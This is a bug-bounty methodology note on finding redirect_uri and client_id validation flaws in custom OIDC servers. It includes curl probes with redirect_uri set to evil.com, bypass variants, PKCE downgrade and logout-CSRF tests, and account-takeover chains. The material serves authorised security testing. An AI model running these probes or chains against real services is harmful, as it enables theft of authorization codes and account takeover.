---
type: pattern
title: Pattern - Custom OIDC Redirect URI Validation
tags: [pattern, cwe-601, cwe-287, oauth, oidc, redirect-uri, ato, bb-pattern]
status: verified
vuln_class: oauth-redirect-uri-validation
severity_range: P2-P1
last_updated: 2026-06-03
---

# Pattern - Custom OIDC Redirect URI Validation

> Self-implemented OIDC / OAuth servers almost always have `redirect_uri` validation flaws — the question is never "is there validation," but "at which layer does validation happen" and "can the validation logic be bypassed."

## Why This Is a Real Vulnerability, Not Noise

The OAuth 2.0 / OIDC `redirect_uri` is the delivery destination for the authorization code / token. If an attacker can control `redirect_uri`, the authorization code or access token gets sent to the attacker's server — direct account takeover (ATO).

Library-based OIDC implementations (Keycloak, Auth0, Okta) typically enforce strict exact-string matching. **Custom implementations** are prone to:
- Validation happening only client-side (JS)
- Server-side using suffix match instead of exact match
- Validation deferred to the callback endpoint instead of the authorization endpoint (too late)
- `client_id` not validated — any value accepted
- PKCE allowed to downgrade to `plain`

**Stop-loss rule**: if completing the full OAuth flow requires a login you cannot obtain (e.g., a paid account), mark the finding `verification_level: B` (static analysis) and be explicit about the blocker in the report. Do not speculate that the exploit succeeds.

---

## Case Study: Custom OIDC Provider (Consumer Platform)

**Target profile**: a consumer-electronics vendor's companion-app authentication domain, running a self-implemented OIDC server (not a library-based provider).
**Severity**: P2 Medium (`verification_level: B` — static + partial dynamic; blocker = required paid account)

**Observed behavior**:

```bash
# Arbitrary redirect_uri → HTTP 200 (URL layer does not reject it)
curl -si "https://account.target.example.com/login?response_type=code&client_id=test&redirect_uri=https%3A%2F%2Fevil.com&scope=openid&state=1&code_challenge=abc&code_challenge_method=S256"
# → HTTP 200 (expected: 400 Bad Request or a 302 to an error page)

# Arbitrary client_id also not rejected
# client_id=test, client_id=attacker → same 200
```

**Conclusion (static)**:
- The URL layer (`/login` endpoint) does not validate `redirect_uri` — any rejection (if it exists) happens post-login
- `client_id` has no enforced allowlist
- Missing CSP and X-Frame-Options (assists clickjacking-triggered OAuth flows)
- PKCE plain downgrade untested (requires an account)

**Blocker**: completing the full OAuth flow with a real `client_id` requires a paid account on the target platform.

---

## Detection Signals

| Signal | Tool | Meaning |
|--------|------|---------|
| `/.well-known/openid-configuration` exists and is not a third-party OIDC | curl | Custom OIDC server — high-priority target |
| `/login?redirect_uri=evil.com` → 200 or no error | curl | URL layer does not validate redirect_uri |
| Arbitrary `client_id` → 200 | curl | No client allowlist |
| `code_challenge_method=plain` → 200 (not rejected) | curl | PKCE plain downgrade possible |
| `end_session_endpoint` has no CSRF token | curl/browser | Logout CSRF |
| Response omits `state` validation, or scope is overly broad | Read OIDC discovery doc | Leftover implicit flow or scope issue |
| `response_type=token` is accepted | curl | Implicit flow (token in URL fragment, referer-leak risk) |

---

## Grep / Test Methodology

### Step 1: Confirm whether this is a custom OIDC server

```bash
TARGET="https://account.target.example.com"

# Fetch OIDC discovery document
curl -s "${TARGET}/.well-known/openid-configuration" | jq '{
  issuer,
  authorization_endpoint,
  token_endpoint,
  userinfo_endpoint,
  end_session_endpoint,
  code_challenge_methods_supported,
  response_types_supported,
  grant_types_supported
}'

# If issuer is the target's own domain (not accounts.google.com, cognito, auth0.com, etc.)
# → custom implementation, prioritize testing
```

### Step 2: redirect_uri validation tests

```bash
AUTH_EP="https://account.target.example.com/login"
CLIENT_ID="your_real_client_id"   # get from the app's JS bundle or network traffic first; use a test value if unavailable

# Test 1: completely different domain
curl -si "${AUTH_EP}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=https%3A%2F%2Fevil.com&scope=openid&state=csrf123&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256" \
  | head -5

# Test 2: suffix-match bypass (target is app.example.com, test attackerapp.example.com)
curl -si "${AUTH_EP}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=https%3A%2F%2Fattackerapp.example.com%2Fcallback&scope=openid&state=csrf123" \
  | head -5

# Test 3: path traversal (registered: /callback, test /callback/../evil)
curl -si "${AUTH_EP}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcallback%2F..%2Fevil&scope=openid&state=csrf123" \
  | head -5

# Test 4: fragment (#) bypass — some implementations only compare the part before #
curl -si "${AUTH_EP}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcallback%23https%3A%2F%2Fevil.com&scope=openid&state=csrf123" \
  | head -5

# Test 5: open-redirect chain (if app.example.com has an open redirect)
# redirect_uri=https://app.example.com/redirect?url=https://evil.com
curl -si "${AUTH_EP}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=https%3A%2F%2Fapp.example.com%2Fredirect%3Furl%3Dhttps%3A%2F%2Fevil.com&scope=openid&state=csrf123" \
  | head -5

# Reading the results:
# HTTP 400 "invalid redirect_uri" = validation exists
# HTTP 200 / 302 continues the flow = URL layer has no validation (may validate post-login)
# HTTP 302 to evil.com before login = Critical
```

### Step 3: client_id allowlist test

```bash
# arbitrary client_id
curl -si "${AUTH_EP}?response_type=code&client_id=attacker&redirect_uri=https%3A%2F%2Fevil.com&scope=openid&state=1" | head -5
curl -si "${AUTH_EP}?response_type=code&client_id=&redirect_uri=https%3A%2F%2Fevil.com&scope=openid&state=1" | head -5

# 200 = client_id has no enforced allowlist
# no client_id allowlist + no redirect_uri validation → attacker can start an OAuth flow with a custom client_id + custom redirect_uri
```

### Step 4: PKCE plain-downgrade test

```bash
# S256 → plain downgrade (requires an account to complete the flow)
curl -si "${AUTH_EP}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=REGISTERED_URI&scope=openid&state=1&code_challenge=plain_verifier&code_challenge_method=plain" \
  | head -5

# plain → no PKCE at all
curl -si "${AUTH_EP}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=REGISTERED_URI&scope=openid&state=1" \
  | head -5

# accepting plain or no PKCE → possible code-interception attack (low severity alone, but escalates in combination)
```

### Step 5: Logout CSRF (end_session_endpoint)

```bash
END_SESSION_EP=$(curl -s "${TARGET}/.well-known/openid-configuration" | jq -r '.end_session_endpoint')

# test for CSRF protection
curl -si -X POST "${END_SESSION_EP}" -d "token=anything" | head -5
curl -si "${END_SESSION_EP}?post_logout_redirect_uri=https%3A%2F%2Fevil.com" | head -5
```

### Step 6: Recover the real client_id from a JS bundle

```bash
# search the app's JS bundle for client_id
curl -s "https://app.target.example.com/" | grep -oP 'client_id["\s:=]+["\x27][^\s"<\x27]{5,80}'

# or from network requests (browser DevTools → Network → search for openid-configuration)
# usually visible in the URL during the /login redirect
```

---

## Variants / Chain

### Base: Code Theft → ATO

```
Insufficient redirect_uri validation (no validation at the URL layer)
  + attacker lures the victim into clicking a crafted authorization URL
  + after login, the code is redirected to evil.com
  → attacker exchanges the code for an access_token + id_token
  → ATO (Account Takeover)
```

### Escalation: Open Redirect Chain

```
target app has an open redirect (/redirect?url=evil.com)
  + redirect_uri validation uses origin/prefix match (allows any path under app.target.com)
  → redirect_uri = https://app.target.com/redirect?url=https://evil.com
  → validation passes (legitimate origin) → redirects to evil.com
  → code leaks to evil.com (via referer or the redirect itself)
```

### Escalation: PKCE Plain Downgrade → MITM

```
PKCE plain allowed (or PKCE not enforced)
  + code interception (MITM setting, e.g. public Wi-Fi)
  → steal the code → exchange for a token (no PKCE verifier protection)
```

### Escalation: Implicit Flow (token in URL fragment)

```
response_type=token is accepted
  → access_token appears in the URL fragment (#)
  → any referer leak or browser history exposes the token
  → more severe than the code flow (token is directly usable)
```

### Assist: Clickjacking (missing X-Frame-Options / CSP)

```
login page can be embedded in an iframe
  → attacker can silently initiate an OAuth flow (no victim click needed)
  → combined with a redirect_uri bypass → lower-friction ATO
```

---

## Severity Guide

| Condition | Severity | Notes |
|-----------|----------|-------|
| redirect_uri not validated at all + code directly redirected to evil.com (verified) | P1 Critical | direct ATO, no additional conditions needed |
| redirect_uri suffix-match bypass (attacker controls a subdomain) + full flow verified | P1-P2 Critical/High | can combine with subdomain takeover |
| redirect_uri bypassed via an open-redirect chain (verified) | P2 High | requires finding an open redirect first |
| URL layer unvalidated (HTTP 200) but validated post-login (not fully tested) | P2 Medium | verification_level: B |
| No client_id allowlist + no redirect_uri validation (static observation only) | P2 Medium | theoretical chain needs account-based verification |
| PKCE plain downgrade (no additional bypass) | P3-P4 Medium/Low | requires a specific attack environment (MITM) |
| Logout CSRF (end_session_endpoint) | P3-P4 | usually just forces logout, generally low impact |
| Missing X-Frame-Options (alone) | P5 Informational | usually not worth reporting standalone |

**Anti-overclaim reminder**: mark findings like this `verification_level: B` when appropriate. "URL layer does not reject arbitrary redirect_uri" can be statically confirmed, but "attacker can complete code theft → ATO" is not yet end-to-end verified without an account. Write "URL layer does not reject arbitrary redirect_uri (verified); full exploit flow pending account access" — do not write "attacker can steal authorization codes" as an already-established fact.

---

## Related

- [[Pattern - OAuth Misconfiguration]]
- [[Pattern - Open Redirect]]
- [[Lessons Learned]] — pre-submission validation checklist

## Additional Notes

- **Weakness taxonomy**: (1) client-side-only validation (checked in JS, never on the server); (2) prefix match (`starts_with`, bypassable with `?attacker.com`); (3) suffix match (`ends_with`, bypassable with `attacker.com/legit`); (4) no validation at all (any URI accepted).
- **Custom vs. library risk profile**: implementations using a library (`python-social-auth`, `authlib`, `node-oidc-provider`, etc.) usually only have configuration errors (registered-URI mismatches); fully custom implementations are more likely to have actual validation-bypass bugs.
